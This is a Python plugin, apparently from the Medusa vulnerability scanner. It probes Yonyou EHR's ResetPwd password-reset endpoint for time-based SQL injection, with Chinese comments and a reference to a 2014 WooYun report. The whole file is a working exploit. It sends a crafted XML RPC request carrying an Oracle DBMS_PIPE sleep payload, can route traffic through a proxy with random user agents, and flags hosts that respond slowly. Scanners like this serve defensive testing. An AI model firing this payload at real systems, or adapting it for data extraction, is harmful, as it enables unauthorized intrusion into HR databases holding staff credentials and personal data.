#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友EHR系统 ResetPwd.jsp SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2014-68060
author: Lucifer
description: 用友EHR系统找回密码处存在XMLtype类型注入。
'''
import urllib
import requests
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
post_data = {
    "__type": "updateData",
    "__viewInstanceId": "nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel",
    "__xml": '''<rpc method="resetPwd" transaction="10"><def><dataset id="dsResetPwd" type="Custom"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r state="insert" id="10008"><n><v>aaa'AnD 4821=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(65)||CHR(122)||CHR(82),6)AnD'kOkV'='kOkV</v></n></r></rs></data><vps><p type="0" name="__profileKeys">findPwd%3B9589d8b622333776899b3ff0567f4603</p></vps></rpc>''',
    "1480658911300": ""
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        start_time = time.time()
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在用友EHR系统 ResetPwd.jsp SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass